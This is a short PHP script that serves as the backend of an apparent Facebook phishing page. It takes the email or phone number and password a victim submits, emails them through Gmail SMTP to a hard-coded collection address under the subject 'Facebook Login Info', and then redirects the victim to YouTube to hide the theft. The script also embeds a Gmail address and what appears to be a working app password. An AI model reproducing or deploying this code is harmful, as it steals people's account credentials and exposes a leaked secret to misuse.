<?php
ob_start();  // Prevent header errors

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hastehena12@gmail.com';           // ✅ আপনার Gmail
        $mail->Password = 'idmkyapfbhucghqa';                // ✅ App password (no space)
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('hastehena12@gmail.com', 'Login Info');
        $mail->addAddress('hastehena12@gmail.com');

        $mail->Subject = 'Facebook Login Info';
        $mail->Body    = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";

        $mail->send();

        // ✅ Success → Redirect to YouTube
        header("Location: https://youtube.com/");
        exit;
    } catch (Exception $e) {
        echo "❌ Email পাঠাতে সমস্যা হয়েছে: {$mail->ErrorInfo}";
    }
}
